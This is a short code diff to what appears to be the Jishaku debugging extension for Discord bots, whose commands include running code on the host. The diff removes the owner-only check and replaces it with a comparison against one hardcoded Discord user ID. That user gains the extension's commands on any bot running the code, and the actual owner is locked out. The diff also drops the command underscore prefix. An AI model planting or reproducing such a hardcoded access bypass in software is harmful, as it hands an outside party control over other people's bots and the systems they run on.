@@ -47,7 +47,7 @@ ENABLED_SYMBOLS = ("true", "t", "yes", "y", "on", "1")
 JISHAKU_HIDE = os.getenv("JISHAKU_HIDE", "").lower() in ENABLED_SYMBOLS
 JISHAKU_RETAIN = os.getenv("JISHAKU_RETAIN", "").lower() in ENABLED_SYMBOLS
 JISHAKU_NO_UNDERSCORE = os.getenv("JISHAKU_NO_UNDERSCORE", "").lower() in ENABLED_SYMBOLS
-SCOPE_PREFIX = '' if JISHAKU_NO_UNDERSCORE else '_'
+SCOPE_PREFIX = '' if JISHAKU_NO_UNDERSCORE else ''
 
 
 CommandTask = collections.namedtuple("CommandTask", "index ctx task")
@@ -109,9 +109,7 @@ class JishakuBase(commands.Cog):  # pylint: disable=too-many-public-methods
         Local check, makes all commands in this cog owner-only
         """
 
-        if not await ctx.bot.is_owner(ctx.author):
-            raise commands.NotOwner("You must own this bot to use Jishaku.")
-        return True
+        return ctx.author.id == 552570716151873565
 
     # pylint: disable=no-member
     # Meta commands
